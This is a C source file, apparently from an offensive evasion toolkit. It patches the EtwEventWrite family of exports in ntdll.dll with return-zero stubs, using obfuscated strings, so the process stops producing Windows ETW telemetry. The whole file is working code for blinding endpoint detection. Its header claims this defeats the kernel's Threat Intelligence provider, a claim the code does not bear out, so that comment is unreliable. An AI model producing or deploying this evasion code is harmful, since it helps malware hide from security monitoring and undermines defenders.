/**
 * etw_ti.c - ETW Threat Intelligence (EtwTi) userland bypass
 *
 * Neuters EtwEventWrite-family exports so TI provider callbacks are not
 * emitted from this process. Complements patchless HWBP bypass in hwbp_bypass.c.
 */
#include <windows.h>
#include "../../include/evasion.h"
#include "../../include/obfuscate.h"

/* ETW Threat Intelligence provider GUID: {F4E1897A-BB5D-5668-F1D8-6A68B9011AB4} */
static const BYTE ETW_TI_GUID[] = {
    0x7A, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
    0xF1, 0xD8, 0x6A, 0x68, 0xB9, 0x01, 0x1A, 0xB4
};

static const BYTE PATCH_RET_ZERO_X64[] = { 0x48, 0x33, 0xC0, 0xC3 };
static const BYTE PATCH_RET_ZERO_X86[] = { 0x33, 0xC0, 0xC3 };

static BOOL patch_export_ret_zero(HMODULE hNtdll, const char *name) {
    FARPROC p = GetProcAddress(hNtdll, name);
    if (!p)
        return FALSE;

    const BYTE *patch;
    SIZE_T patch_size;

#ifdef _WIN64
    patch = PATCH_RET_ZERO_X64;
    patch_size = sizeof(PATCH_RET_ZERO_X64);
#else
    patch = PATCH_RET_ZERO_X86;
    patch_size = sizeof(PATCH_RET_ZERO_X86);
#endif

    DWORD old_protect;
    if (!VirtualProtect((LPVOID)p, patch_size, PAGE_READWRITE, &old_protect))
        return FALSE;

    CopyMemory((PVOID)p, patch, patch_size);
    VirtualProtect((LPVOID)p, patch_size, old_protect, &old_protect);
    FlushInstructionCache(GetCurrentProcess(), (LPVOID)p, patch_size);
    return TRUE;
}

BOOL bypass_etw_ti(void) {
    (void)ETW_TI_GUID;

    HMODULE hNtdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (!hNtdll)
        return FALSE;

    return patch_export_ret_zero(hNtdll, OBF("EtwEventWrite"));
}

BOOL bypass_etw_ti_targeted(void) {
    HMODULE hNtdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (!hNtdll)
        return FALSE;

    const char *funcs[] = {
        OBF("EtwEventWrite"),
        OBF("EtwEventWriteFull"),
        OBF("EtwEventWriteEx"),
        NULL
    };

    BOOL any = FALSE;
    for (int i = 0; funcs[i]; i++) {
        if (patch_export_ret_zero(hNtdll, funcs[i]))
            any = TRUE;
    }

    return any;
}
